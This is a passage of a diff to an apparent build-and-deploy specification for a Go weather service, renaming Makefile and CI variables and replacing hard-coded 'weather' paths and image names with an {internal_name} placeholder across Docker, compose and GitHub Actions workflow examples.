 		$(GO_DOCKER) sh -c "GOOS=$$(go env GOOS) GOARCH=$$(go env GOARCH) \
-			go build -ldflags \"$(LDFLAGS)\" -o $(BINDIR)/$(PROJECTNAME)-cli ./src/client"; \
+			go build -ldflags \"$(LDFLAGS)\" -o $(BINDIR)/$(PROJECT_NAME)-cli ./src/client"; \
 	fi
 
 	# Build agent binary (if exists)
 	@if [ -d "src/agent" ]; then \
-		echo "Building $(PROJECTNAME)-agent..."; \
+		echo "Building $(PROJECT_NAME)-agent..."; \
 		$(GO_DOCKER) sh -c "GOOS=$$(go env GOOS) GOARCH=$$(go env GOARCH) \
-			go build -ldflags \"$(LDFLAGS)\" -o $(BINDIR)/$(PROJECTNAME)-agent ./src/agent"; \
+			go build -ldflags \"$(LDFLAGS)\" -o $(BINDIR)/$(PROJECT_NAME)-agent ./src/agent"; \
 	fi
 
 	@echo "Local build complete: $(BINDIR)/"
@@ -34820,7 +36463,7 @@ release: build
 	@echo "$(VERSION)" > $(RELDIR)/version.txt
 
 	# Copy binaries to releases (strip if needed)
-	@for f in $(BINDIR)/$(PROJECTNAME)-*; do \
+	@for f in $(BINDIR)/$(PROJECT_NAME)-*; do \
 		[ -f "$$f" ] || continue; \
 		strip "$$f" 2>/dev/null || true; \
 		cp "$$f" $(RELDIR)/; \
@@ -34829,7 +36472,7 @@ release: build
 	# Create source archive (exclude VCS and build artifacts)
 	@tar --exclude='.git' --exclude='.github' --exclude='.gitea' \
 		--exclude='binaries' --exclude='releases' --exclude='*.tar.gz' \
-		-czf $(RELDIR)/$(PROJECTNAME)-$(VERSION)-source.tar.gz .
+		-czf $(RELDIR)/$(PROJECT_NAME)-$(VERSION)-source.tar.gz .
 
 	# Delete existing release/tag if exists
 	@gh release delete $(VERSION) --yes 2>/dev/null || true
@@ -34838,7 +36481,7 @@ release: build
 
 	# Create new release (stable)
 	@gh release create $(VERSION) $(RELDIR)/* \
-		--title "$(PROJECTNAME) $(VERSION)" \
+		--title "$(PROJECT_NAME) $(VERSION)" \
 		--notes "Release $(VERSION)" \
 		--latest
 
@@ -34856,8 +36499,8 @@ docker:
 	@docker buildx version > /dev/null 2>&1 || (echo "docker buildx required" && exit 1)
 
 	# Create/use builder
-	@docker buildx create --name $(PROJECTNAME)-builder --use 2>/dev/null || \
-		docker buildx use $(PROJECTNAME)-builder
+	@docker buildx create --name $(PROJECT_NAME)-builder --use 2>/dev/null || \
+		docker buildx use $(PROJECT_NAME)-builder
 
 	# Build and push multi-arch (multi-stage Dockerfile handles Go compilation)
 	@docker buildx build \
@@ -34896,20 +36539,20 @@ test:
 dev:
 	@mkdir -p $(GOCACHE) $(GODIR)
 	@$(GO_DOCKER) go mod tidy
-	@mkdir -p "$${TMPDIR:-/tmp}/$(PROJECTORG)" && \
-		BUILD_DIR=$$(mktemp -d "$${TMPDIR:-/tmp}/$(PROJECTORG)/$(PROJECTNAME)-XXXXXX") && \
+	@mkdir -p "$${TMPDIR:-/tmp}/$(PROJECT_ORG)" && \
+		BUILD_DIR=$$(mktemp -d "$${TMPDIR:-/tmp}/$(PROJECT_ORG)/$(PROJECT_NAME)-XXXXXX") && \
 		echo "Quick dev build to $$BUILD_DIR..." && \
-		$(GO_DOCKER) go build -o $$BUILD_DIR/$(PROJECTNAME) ./src && \
-		echo "Built: $$BUILD_DIR/$(PROJECTNAME)" && \
+		$(GO_DOCKER) go build -o $$BUILD_DIR/$(PROJECT_NAME) ./src && \
+		echo "Built: $$BUILD_DIR/$(PROJECT_NAME)" && \
 		if [ -d "src/client" ]; then \
-			$(GO_DOCKER) go build -o $$BUILD_DIR/$(PROJECTNAME)-cli ./src/client && \
-			echo "Built: $$BUILD_DIR/$(PROJECTNAME)-cli"; \
+			$(GO_DOCKER) go build -o $$BUILD_DIR/$(PROJECT_NAME)-cli ./src/client && \
+			echo "Built: $$BUILD_DIR/$(PROJECT_NAME)-cli"; \
 		fi && \
 		if [ -d "src/agent" ]; then \
-			$(GO_DOCKER) go build -o $$BUILD_DIR/$(PROJECTNAME)-agent ./src/agent && \
-			echo "Built: $$BUILD_DIR/$(PROJECTNAME)-agent"; \
+			$(GO_DOCKER) go build -o $$BUILD_DIR/$(PROJECT_NAME)-agent ./src/agent && \
+			echo "Built: $$BUILD_DIR/$(PROJECT_NAME)-agent"; \
 		fi && \
-		echo "Test:  docker run --rm -v $$BUILD_DIR:/app alpine:latest /app/$(PROJECTNAME) --help"
+		echo "Test:  docker run --rm -v $$BUILD_DIR:/app alpine:latest /app/$(PROJECT_NAME) --help"
 
 # =============================================================================
 # CLEAN - Remove build artifacts
@@ -35008,7 +36651,7 @@ All Docker builds use persistent Go module caching to avoid re-downloading depen
 1. Quick build for local development/testing
 2. Builds local platform only (fastest)
 3. No `-ldflags` (version info not embedded)
-4. Outputs to `{tempdir}/apimgr/weather-XXXXXX/` (isolated, org-identifiable)
+4. Outputs to `{temp_dir}/apimgr/{internal_name}-XXXXXX/` (isolated, org-identifiable)
 5. Uses Docker (`golang:alpine`) - keeps local machine clean
 6. Easy cleanup: `rm -rf "${TMPDIR:-/tmp}"/$APIMGR.*/` or auto-deleted on reboot
 
@@ -35351,13 +36994,13 @@ docker/
 
 | Path | Purpose |
 |------|---------|
-| `/config/weather/` | App config (server.yml, ssl/, tor/) |
-| `/data/weather/` | App data (uploads, cache, tor/) |
+| `/config/{internal_name}/` | App config (server.yml, ssl/, tor/) |
+| `/data/{internal_name}/` | App data (uploads, cache, tor/) |
 | `/data/db/sqlite/` | SQLite databases (server.db, users.db) |
 | `/data/db/postgres/` | PostgreSQL data directory |
 | `/data/db/valkey/` | Valkey/Redis persistence |
-| `/data/log/weather/` | App logs |
-| `/data/backups/weather/` | Backup archives |
+| `/data/log/{internal_name}/` | App logs |
+| `/data/backups/{internal_name}/` | Backup archives |
 | `/usr/local/bin/weather` | Application binary |
 
 **Host Volume Mapping (docker-compose):**
@@ -35482,7 +37125,7 @@ RUN go mod download
 # Copy source and build
 COPY . .
 RUN CGO_ENABLED=0 GOOS=linux GOARCH=${TARGETARCH} go build \
-    -ldflags "-s -w -X 'main.Version=${VERSION}' -X 'main.CommitID=${COMMIT_ID}' -X 'main.BuildDate=${BUILD_DATE}' -X 'main.OfficialSite=$https://wthr.top'" \
+    -ldflags "-s -w -X 'main.Version=${VERSION}' -X 'main.CommitID=${COMMIT_ID}' -X 'main.BuildDate=${BUILD_DATE}' -X 'main.OfficialSite=${OFFICIAL_SITE}'" \
     -o /build/binary/weather ./src
 
 # =============================================================================
@@ -35685,7 +37328,7 @@ exec $APP_BIN $FLAGS "$@"
 **MODE vs DEBUG:**
 - `MODE=development`: Relaxed security, verbose logging, no caching (sensible for local dev)
 - `MODE=production`: Strict security, minimal logging, caching enabled
-- `DEBUG=true`: Enables debug endpoints (`/debug/*`), regardless of MODE
+- `DEBUG=true`: Enables debug endpoints (`/api/{api_version}/debug/*`, `/api/debug/*`, `/server/debug`), regardless of MODE
 
 **Note:** Boolean env vars accept all truthy/falsy values (see Boolean Values table). Examples: `DEBUG=yes`, `DEBUG=enable`, `DEBUG=1`, `DEBUG=oui`.
 
@@ -35725,7 +37368,7 @@ x-logging: &default-logging
 
 services:
   weather:
-    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
+    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest
     container_name: weather-app
     hostname: ${BASE_HOST_NAME:-$HOSTNAME}
     restart: always
@@ -35805,7 +37448,7 @@ x-logging: &default-logging
 
 services:
   weather:
-    image: ghcr.io/apimgr/weather:latest
+    image: ghcr.io/apimgr/{internal_name}:latest
     container_name: weather-app
     hostname: ${BASE_HOST_NAME:-$HOSTNAME}
     restart: always
@@ -35942,7 +37585,7 @@ x-logging: &default-logging
 
 services:
   weather:
-    image: ghcr.io/apimgr/weather:latest-aio
+    image: ghcr.io/apimgr/{internal_name}:latest-aio
     container_name: weather-app
     hostname: ${BASE_HOST_NAME:-$HOSTNAME}
     restart: always
@@ -36001,7 +37644,7 @@ networks:
 # All-in-One Dockerfile - includes app + postgresql + valkey + tor
 # Build: golang:alpine (static binary, CGO_ENABLED=0)
 # Runtime: debian:latest (stable, broad compatibility)
-# Image name: {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest-aio
+# Image name: {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest-aio
 # PORTS: Only 80 exposed (db/cache are internal-only)
 
 # =============================================================================
@@ -36115,7 +37758,7 @@ stdout_logfile=/data/log/valkey.log
 stderr_logfile=/data/log/valkey.log
 
 [program:tor]
-command=/usr/bin/tor -f /config/weather/tor/torrc
+command=/usr/bin/tor -f /config/{internal_name}/tor/torrc
 autostart=%(ENV_TOR_ENABLED)s
 autorestart=true
 priority=30
@@ -36291,10 +37934,10 @@ valkeyURL := "unix:///run/valkey/valkey.sock"
 
 ```bash
 # Standard image (context is project root)
-docker build -t {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest -f docker/Dockerfile .
+docker build -t {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest -f docker/Dockerfile .
 
 # All-in-one image (context is project root)
-docker build -t {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest-aio -f docker/Dockerfile.aio .
+docker build -t {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest-aio -f docker/Dockerfile.aio .
 ```
 
 **When to use All-in-One:**
@@ -36360,18 +38003,18 @@ $TEMP_DIR/
 
 | Container Path | Contents |
 |----------------|----------|
-| `/config/weather/` | Binary's {config_dir} - server.yml, etc. |
-| `/config/weather/ssl/` | TLS certs and keys |
-| `/config/weather/tor/` | Tor config (torrc) - binary owns Tor |
-| `/config/{servicename}/` | External service configs (valkey, nginx, etc.) |
-| `/data/weather/` | Binary's {data_dir} |
-| `/data/weather/security/` | Security DBs (geoip, blocklists, cve, trivy) |
-| `/data/weather/tor/` | Tor data (hidden service keys) - binary owns Tor |
-| `/data/db/{dbtype}/` | Database data (postgres, valkey, sqlite, etc.) |
-| `/data/log/weather/` | App logs (access.log, error.log, tor.log) |
-| `/data/log/{servicename}/` | Service logs (nginx, caddy, etc.) |
-| `/data/backups/weather/` | Backup files |
-| `/data/{servicename}/` | External service data (nginx, apache, etc.) |
+| `/config/{internal_name}/` | Binary's {config_dir} - server.yml, etc. |
+| `/config/{internal_name}/ssl/` | TLS certs and keys |
+| `/config/{internal_name}/tor/` | Tor config (torrc) - binary owns Tor |
+| `/config/{service_name}/` | External service configs (valkey, nginx, etc.) |
+| `/data/{internal_name}/` | Binary's {data_dir} |
+| `/data/{internal_name}/security/` | Security DBs (geoip, blocklists, cve, trivy) |
+| `/data/{internal_name}/tor/` | Tor data (hidden service keys) - binary owns Tor |
+| `/data/db/{db_type}/` | Database data (postgres, valkey, sqlite, etc.) |
+| `/data/log/{internal_name}/` | App logs (access.log, error.log, tor.log) |
+| `/data/log/{service_name}/` | Service logs (nginx, caddy, etc.) |
+| `/data/backups/{internal_name}/` | Backup files |
+| `/data/{service_name}/` | External service data (nginx, apache, etc.) |
 
 **Rules:**
 - Production volumes use `:z` suffix (SELinux shared label)
@@ -36391,7 +38034,7 @@ $TEMP_DIR/
 5. Data lives in temp dir, isolated from project
 
 ```bash
-# Setup (uses OS temp dir: {ostempdir}/apimgr/weather-XXXXXX/)
+# Setup (uses OS temp dir: {os_temp_dir}/apimgr/{internal_name}-XXXXXX/)
 # Set PROJECT_ROOT to your actual project location
 PROJECT_ROOT="$(git rev-parse --show-toplevel)"  # Use git top-level
 # Or use absolute path: PROJECT_ROOT="/path/to/your/project"
@@ -36432,8 +38075,8 @@ rm -rf "$TEMP_DIR"
 
 | Mode | Format | Example |
 |------|--------|---------|
-| Development | `{randomport}:80` | `64580:80` |
-| Production | `172.17.0.1:{randomport}:80` | `172.17.0.1:64580:80` |
+| Development | `{random_port}:80` | `64580:80` |
+| Production | `172.17.0.1:{random_port}:80` | `172.17.0.1:64580:80` |
 
 **Rules:**
 - Internal port defaults to `80` (override with `PORT` env var)
@@ -36472,7 +38115,7 @@ name: weather-dev
 
 services:
   weather:
-    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
+    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest
     pull_policy: always
     container_name: weather-dev
     restart: always
@@ -36503,7 +38146,7 @@ networks:
 **Run:**
 ```bash
 mkdir -p "${TMPDIR:-/tmp}/apimgr"
-TEMP_DIR=$(mktemp -d "${TMPDIR:-/tmp}/apimgr/weather-XXXXXX")
+TEMP_DIR=$(mktemp -d "${TMPDIR:-/tmp}/apimgr/{internal_name}-XXXXXX")
 mkdir -p "$TEMP_DIR/rootfs/config" "$TEMP_DIR/rootfs/data"
 cp docker/docker-compose.dev.yml "$TEMP_DIR/docker-compose.yml"
 cd "$TEMP_DIR" && docker compose up -d
@@ -36522,7 +38165,7 @@ name: weather
 
 services:
   weather:
-    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
+    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest
     pull_policy: always
     container_name: weather-app
     restart: always
@@ -36558,7 +38201,7 @@ networks:
 **Run:**
 ```bash
 mkdir -p "${TMPDIR:-/tmp}/apimgr"
-TEMP_DIR=$(mktemp -d "${TMPDIR:-/tmp}/apimgr/weather-XXXXXX")
+TEMP_DIR=$(mktemp -d "${TMPDIR:-/tmp}/apimgr/{internal_name}-XXXXXX")
 mkdir -p "$TEMP_DIR/rootfs/config" "$TEMP_DIR/rootfs/data"
 cp docker/docker-compose.yml "$TEMP_DIR/"
 cd "$TEMP_DIR" && docker compose up -d
@@ -36577,7 +38220,7 @@ name: weather-test
 
 services:
   weather:
-    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
+    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest
     pull_policy: always
     container_name: weather-test
     restart: "no"
@@ -36605,7 +38248,7 @@ networks:
 **AI/Automated Testing Workflow (REQUIRED):**
 ```bash
 mkdir -p "${TMPDIR:-/tmp}/apimgr"
-TEMP_DIR=$(mktemp -d "${TMPDIR:-/tmp}/apimgr/weather-XXXXXX")
+TEMP_DIR=$(mktemp -d "${TMPDIR:-/tmp}/apimgr/{internal_name}-XXXXXX")
 mkdir -p "$TEMP_DIR/rootfs/config" "$TEMP_DIR/rootfs/data"
 cp docker/docker-compose.test.yml "$TEMP_DIR/docker-compose.yml"
 cd "$TEMP_DIR" && docker compose up --abort-on-container-exit
@@ -36621,7 +38264,7 @@ name: weather
 
 services:
   weather:
-    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest
+    image: {PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest
     pull_policy: always
     container_name: weather-app
     restart: always
@@ -36683,14 +38326,14 @@ networks:
 | Setting | Value |
 |---------|-------|
 | Internal port | **80** (always) |
-| Config dir | `/config/weather/` (binary's {config_dir}) |
-| Security dir | `/data/weather/security/` |
-| Tor config dir | `/config/weather/tor/` (binary owns Tor) |
-| Data dir | `/data/weather/` (binary's {data_dir}) |
-| Tor data dir | `/data/weather/tor/` (binary owns Tor) |
-| Database dir | `/data/db/{dbtype}/` (postgres, valkey, sqlite) |
-| Log dir | `/data/log/weather/` |
-| Backup dir | `/data/backups/weather/` |
+| Config dir | `/config/{internal_name}/` (binary's {config_dir}) |
+| Security dir | `/data/{internal_name}/security/` |
+| Tor config dir | `/config/{internal_name}/tor/` (binary owns Tor) |
+| Data dir | `/data/{internal_name}/` (binary's {data_dir}) |
+| Tor data dir | `/data/{internal_name}/tor/` (binary owns Tor) |
+| Database dir | `/data/db/{db_type}/` (postgres, valkey, sqlite) |
+| Log dir | `/data/log/{internal_name}/` |
+| Backup dir | `/data/backups/{internal_name}/` |
 | Binary | `/usr/local/bin/weather` |
 | HEALTHCHECK | `{binary} --status` |
 
@@ -36700,8 +38343,8 @@ networks:
 |----------------|-----------|---------|
 | `/config` | `./rootfs/config` | Configuration root (organized by component) |
 | `/data` | `./rootfs/data` | Data root (organized by component) |
-| `/config/weather/` | `./rootfs/config/weather/` | Binary's config |
-| `/data/weather/` | `./rootfs/data/weather/` | Binary's data |
+| `/config/{internal_name}/` | `./rootfs/config/{internal_name}/` | Binary's config |
+| `/data/{internal_name}/` | `./rootfs/data/{internal_name}/` | Binary's data |
 | `/data/db/` | `./rootfs/data/db/` | Database data |
 | `/data/log/` | `./rootfs/data/log/` | Log files |
 
@@ -36713,8 +38356,8 @@ networks:
 |----------|-------------|
 | Auto-detection | Tor starts automatically if `tor` binary is installed |
 | Always enabled | Docker image includes `tor`, so always enabled in containers |
-| Config location | Torrc in `/config/weather/tor/torrc` |
-| Data persistence | Tor keys in `/data/weather/tor/site/` (survives restart) |
+| Config location | Torrc in `/config/{internal_name}/tor/torrc` |
+| Data persistence | Tor keys in `/data/{internal_name}/tor/site/` (survives restart) |
 | .onion address | Persists across container restarts via volume mount |
 | Binary owns Tor | Tor dirs under `weather/`, not separate service |
 
@@ -36739,10 +38382,10 @@ networks:
 
 | Tag | Description | Example |
 |-----|-------------|---------|
-| `{PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:latest` | Latest stable release | `ghcr.io/myorg/myapp:latest` |
-| `{PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:{version}` | Specific version | `ghcr.io/myorg/myapp:1.2.3` |
-| `{PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:{YYMM}` | Year/month tag | `ghcr.io/myorg/myapp:2512` |
-| `{PLATFORM_CONTAINER_REGISTRY}/apimgr/weather:{commit}` | Git commit (7 char) | `ghcr.io/myorg/myapp:abc1234` |
+| `{PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:latest` | Latest stable release | `ghcr.io/myorg/myapp:latest` |
+| `{PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:{version}` | Specific version | `ghcr.io/myorg/myapp:1.2.3` |
+| `{PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:{YYMM}` | Year/month tag | `ghcr.io/myorg/myapp:2512` |
+| `{PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}:{commit}` | Git commit (7 char) | `ghcr.io/myorg/myapp:abc1234` |
 
 ### Development Tags (Local)
 
@@ -36760,7 +38403,7 @@ networks:
 
 ### Tag Rules
 
-1. **Release builds** MUST push to `{PLATFORM_CONTAINER_REGISTRY}/apimgr/weather`
+1. **Release builds** MUST push to `{PLATFORM_CONTAINER_REGISTRY}/apimgr/{internal_name}`
 2. **Development builds** MUST use local-only tags (no registry prefix)
 3. **NEVER push `:dev` or `:test` tags to production registry**
 4. All release images built for `linux/amd64` AND `linux/arm64`
@@ -36827,7 +38470,7 @@ All workflows MUST set these environment variables:
 #   echo "COMMIT_ID=$(git rev-parse --short HEAD)" >> $GITHUB_ENV
 #   echo "BUILD_DATE=$(date +"%a %b %d, %Y at %H:%M:%S %Z")" >> $GITHUB_ENV
 # Then use in build step:
-#   LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
+#   LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
 ```
 
 ## Release Workflow (Stable)
@@ -36847,7 +38490,7 @@ permissions:
   contents: write
 
 env:
-  PROJECTNAME: weather
+  PROJECT_NAME: weather
 
 jobs:
   build:
@@ -36887,12 +38530,12 @@ jobs:
           echo "VERSION=${GITHUB_REF_NAME#v}" >> $GITHUB_ENV
           echo "COMMIT_ID=$(git rev-parse --short HEAD)" >> $GITHUB_ENV
           echo "BUILD_DATE=$(date +"%a %b %d, %Y at %H:%M:%S %Z")" >> $GITHUB_ENV
-          # OFFICIALSITE (optional): Set in repository secrets, or site.txt file, or leave empty
+          # OFFICIAL_SITE (optional): Set in repository secrets, or site.txt file, or leave empty
           # Never guess or assume - must be explicitly defined by user
           if [ -f site.txt ]; then
-            echo "OFFICIALSITE=$(cat site.txt)" >> $GITHUB_ENV
+            echo "OFFICIAL_SITE=$(cat site.txt)" >> $GITHUB_ENV
           else
-            echo "OFFICIALSITE=${{ secrets.OFFICIALSITE }}" >> $GITHUB_ENV
+            echo "OFFICIAL_SITE=${{ secrets.OFFICIAL_SITE }}" >> $GITHUB_ENV
           fi
 
       - name: Build server
@@ -36901,8 +38544,8 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
 
       # CLI build - only if src/client/ directory exists
       - name: Build CLI
@@ -36912,21 +38555,21 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
 
       - name: Upload server artifact
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       - name: Upload CLI artifact
         if: hashFiles('src/client/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       # Agent build - only if src/agent/ directory exists
       - name: Build Agent
@@ -36936,15 +38579,15 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/agent
 
       - name: Upload Agent artifact
         if: hashFiles('src/agent/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-agent-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
   release:
     needs: build
@@ -36982,7 +38625,7 @@ jobs:
         run: |
           tar --exclude='.git' --exclude='.github' --exclude='.gitea' \
             --exclude='binaries' --exclude='releases' --exclude='*.tar.gz' \
-            -czf binaries/${{ env.PROJECTNAME }}-${{ env.VERSION }}-source.tar.gz .
+            -czf binaries/${{ env.PROJECT_NAME }}-${{ env.VERSION }}-source.tar.gz .
 
       - name: Create Release
         uses: softprops/action-gh-release@v2
@@ -37009,7 +38652,7 @@ permissions:
   contents: write
 
 env:
-  PROJECTNAME: weather
+  PROJECT_NAME: weather
 
 jobs:
   build:
@@ -37049,12 +38692,12 @@ jobs:
           echo "VERSION=$(date -u +"%Y%m%d%H%M%S")-beta" >> $GITHUB_ENV
           echo "COMMIT_ID=$(git rev-parse --short HEAD)" >> $GITHUB_ENV
           echo "BUILD_DATE=$(date +"%a %b %d, %Y at %H:%M:%S %Z")" >> $GITHUB_ENV
-          # OFFICIALSITE (optional): Set in repository secrets, or site.txt file, or leave empty
+          # OFFICIAL_SITE (optional): Set in repository secrets, or site.txt file, or leave empty
           # Never guess or assume - must be explicitly defined by user
           if [ -f site.txt ]; then
-            echo "OFFICIALSITE=$(cat site.txt)" >> $GITHUB_ENV
+            echo "OFFICIAL_SITE=$(cat site.txt)" >> $GITHUB_ENV
           else
-            echo "OFFICIALSITE=${{ secrets.OFFICIALSITE }}" >> $GITHUB_ENV
+            echo "OFFICIAL_SITE=${{ secrets.OFFICIAL_SITE }}" >> $GITHUB_ENV
           fi
 
       - name: Build server
@@ -37063,8 +38706,8 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src
 
       # CLI build - only if src/client/ directory exists
       - name: Build CLI
@@ -37074,21 +38717,21 @@ jobs:
           GOARCH: ${{ matrix.goarch }}
           CGO_ENABLED: 0
         run: |
-          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIALSITE }}'"
-          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
+          LDFLAGS="-s -w -X 'main.Version=${{ env.VERSION }}' -X 'main.CommitID=${{ env.COMMIT_ID }}' -X 'main.BuildDate=${{ env.BUILD_DATE }}' -X 'main.OfficialSite=${{ env.OFFICIAL_SITE }}'"
+          go build -ldflags "${LDFLAGS}" -o ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }} ./src/client
 
       - name: Upload server artifact
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       - name: Upload CLI artifact
         if: hashFiles('src/client/') != ''
         uses: actions/upload-artifact@v5
         with:
-          name: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: ${{ env.PROJECTNAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
+          name: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}
+          path: ${{ env.PROJECT_NAME }}-cli-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}
 
       # Agent build - only if src/agent/ directory exists
       - name: Build Agent
